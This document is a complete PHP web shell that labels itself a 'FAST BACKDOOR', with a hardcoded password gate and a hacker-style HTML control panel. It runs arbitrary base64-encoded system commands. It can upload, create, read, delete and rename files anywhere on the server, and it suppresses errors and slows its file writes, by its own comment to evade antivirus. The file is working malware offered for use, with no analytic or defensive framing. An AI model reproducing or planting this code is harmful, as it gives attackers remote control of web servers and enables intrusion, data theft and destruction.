<?php
// === FAST BACKDOOR - OPTIMIZED ===
@error_reporting(0);
@set_time_limit(0);

// Quick auth
session_start();
if(!isset($_SESSION['x']) && @$_POST['p'] != 'pass123') {
    die('<form method="post">Pass: <input type="password" name="p"><button>Go</button></form>');
}
$_SESSION['x'] = 1;

// Fast exec
function x($c) {
    $m = ['system', 'exec', 'shell_exec', 'passthru'];
    foreach($m as $f) {
        if(function_exists($f)) {
            if($f == 'exec') {
                @exec($c, $o);
                echo implode("\n", $o);
            } else {
                @$f($c);
            }
            return;
        }
    }
}

// === TERMINAL (NO DELAY) ===
if(isset($_POST['cmd'])) {
    @ob_start();
    x(base64_decode($_POST['cmd']));
    die(base64_encode(@ob_get_clean()));
}

// === UPLOAD (WITH DELAY FOR AV) ===
if(isset($_FILES['f'])) {
    $path = $_POST['path'];
    $tmp = @tempnam(sys_get_temp_dir(), 'u');
    @move_uploaded_file($_FILES['f']['tmp_name'], $tmp);
    $data = @file_get_contents($tmp);
    @unlink($tmp);
    
    // Chunk write dengan delay (HANYA untuk upload)
    $fp = @fopen($path, 'wb');
    for($i = 0; $i < strlen($data); $i += 1024) {
        @fwrite($fp, substr($data, $i, 1024));
        @usleep(50000); // 0.05s
    }
    @fclose($fp);
    @chmod($path, 0644);
    
    die(json_encode(['ok' => 1, 'file' => $path]));
}

// === CREATE FILE (WITH DELAY) ===
if(isset($_POST['create'])) {
    $path = $_POST['path'];
    $content = base64_decode($_POST['data']);
    
    $tmp = @tempnam(sys_get_temp_dir(), 'c');
    @file_put_contents($tmp, $content);
    @sleep(1); // 1 detik delay
    @copy($tmp, $path);
    @unlink($tmp);
    
    die(json_encode(['ok' => 1]));
}

// === FILE OPS (FAST) ===
if(isset($_GET['act'])) {
    switch($_GET['act']) {
        case 'ls':
            $d = $_GET['d'] ?? getcwd();
            $items = @scandir($d);
            $res = [];
            foreach($items as $i) {
                if($i == '.' || $i == '..') continue;
                $p = $d.'/'.$i;
                $res[] = [
                    'n' => $i,
                    't' => @is_dir($p) ? 'd' : 'f',
                    's' => @filesize($p),
                    'p' => substr(sprintf('%o', @fileperms($p)), -4)
                ];
            }
            die(json_encode($res));
            
        case 'read':
            die(base64_encode(@file_get_contents($_GET['f'])));
            
        case 'del':
            @unlink($_GET['f']);
            die('ok');
            
        case 'ren':
            @rename($_GET['from'], $_GET['to']);
            die('ok');
    }
}
?>
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Shell</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Consolas,monospace;background:#000;color:#0f0;padding:20px}
.box{background:#111;border:1px solid #0f0;padding:15px;margin-bottom:15px;border-radius:5px}
h3{color:#0f0;margin-bottom:10px;font-size:14px}
input,textarea,button{background:#000;border:1px solid #0f0;color:#0f0;padding:8px;margin:5px 5px 5px 0;font-family:inherit;border-radius:3px}
button{cursor:pointer}button:hover{background:#003300}
#out{background:#000;padding:10px;min-height:150px;white-space:pre-wrap;word-wrap:break-word;font-size:12px}
.files{list-style:none}.files li{padding:5px;border-bottom:1px solid #003300;font-size:12px}
</style>
</head><body>
<h2 style="color:#0f0;margin-bottom:20px">‚ö° FAST SHELL</h2>

<div class="box">
<h3>TERMINAL</h3>
<input type="text" id="cmd" placeholder="command" style="width:70%">
<button onclick="exec()">RUN</button>
<div id="out"></div>
</div>

<div class="box">
<h3>UPLOAD FILE</h3>
<input type="file" id="file">
<input type="text" id="upath" placeholder="path" value="<?=getcwd()?>/file.txt" style="width:40%">
<button onclick="upload()">UPLOAD</button>
<span id="ures"></span>
</div>

<div class="box">
<h3>CREATE FILE</h3>
<input type="text" id="cpath" placeholder="file path" style="width:60%"><br>
<textarea id="cdata" rows="4" style="width:60%;margin-top:5px" placeholder="content"></textarea><br>
<button onclick="create()">CREATE</button>
</div>

<div class="box">
<h3>FILE MANAGER: <?=getcwd()?></h3>
<input type="text" id="fdir" value="<?=getcwd()?>" style="width:60%">
<button onclick="list()">LIST</button>
<ul class="files" id="flist"></ul>
</div>

<script>
function exec(){
const c=document.getElementById('cmd').value;
fetch('',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'cmd='+btoa(c)})
.then(r=>r.text()).then(d=>document.getElementById('out').textContent=atob(d));
}

function upload(){
const f=document.getElementById('file').files[0];
const p=document.getElementById('upath').value;
const fd=new FormData();fd.append('f',f);fd.append('path',p);
fetch('',{method:'POST',body:fd}).then(r=>r.json()).then(d=>document.getElementById('ures').textContent='‚úì '+d.file);
}

function create(){
const p=document.getElementById('cpath').value;
const d=document.getElementById('cdata').value;
fetch('',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},
body:'create=1&path='+encodeURIComponent(p)+'&data='+btoa(d)})
.then(r=>r.json()).then(()=>alert('File created'));
}

function list(){
const d=document.getElementById('fdir').value;
fetch('?act=ls&d='+encodeURIComponent(d)).then(r=>r.json()).then(files=>{
const ul=document.getElementById('flist');ul.innerHTML='';
files.forEach(f=>{
const li=document.createElement('li');
li.textContent=(f.t==='d'?'üìÅ':'üìÑ')+' '+f.n+' ('+f.s+'b, '+f.p+')';
ul.appendChild(li);
});
});
}
list();
</script>
</body></html>
